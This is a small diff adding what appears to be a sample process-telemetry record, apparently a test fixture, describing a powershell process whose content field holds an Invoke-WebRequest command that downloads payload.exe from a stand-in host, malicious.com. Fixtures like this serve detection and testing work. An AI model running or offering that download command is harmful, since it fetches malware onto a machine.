@@ -1,0 +1,5 @@
+process_name: 'powershell'
+process_id: 2345
+parent_process_id: 1234
+process_path: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+content: 'Invoke-WebRequest -Uri "http://malicious.com/payload.exe" -OutFile "C:\Temp\payload.exe"'
